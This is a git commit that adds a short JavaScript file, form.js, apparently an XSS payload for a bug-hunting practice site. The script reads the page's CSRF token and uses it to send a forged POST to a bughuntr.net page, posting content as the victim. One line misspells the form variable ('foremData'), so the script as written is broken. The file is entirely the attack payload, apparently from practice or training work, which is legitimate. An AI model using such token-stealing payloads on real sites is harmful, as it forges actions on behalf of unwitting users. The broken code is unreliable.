59fc1b4c2c2950b97c76b29bc7c1a2bc1752b56f
/hello <czavaleta93@gmail.com>
2021-11-03 19:23:25 -0500

    Create form.js

---
+++ form.js
@@ -0,0 +1,12 @@
+
+var csrf = document.getElementsByTagName("input")[0].value;
+var formData = new FormData();
+
+formData.append("csrfmiddlewaretoken", csrf);
+formData.append("creator", "fromBot");
+foremData.append("body", "test1");
+
+fetch("https://hackedabacus.br2.bughuntr.net/view/9dcacd4c-a0c4-4ed1-9fb6-8f3aba773d8f",{
+	method: 'POST',
+	body: formData
+});
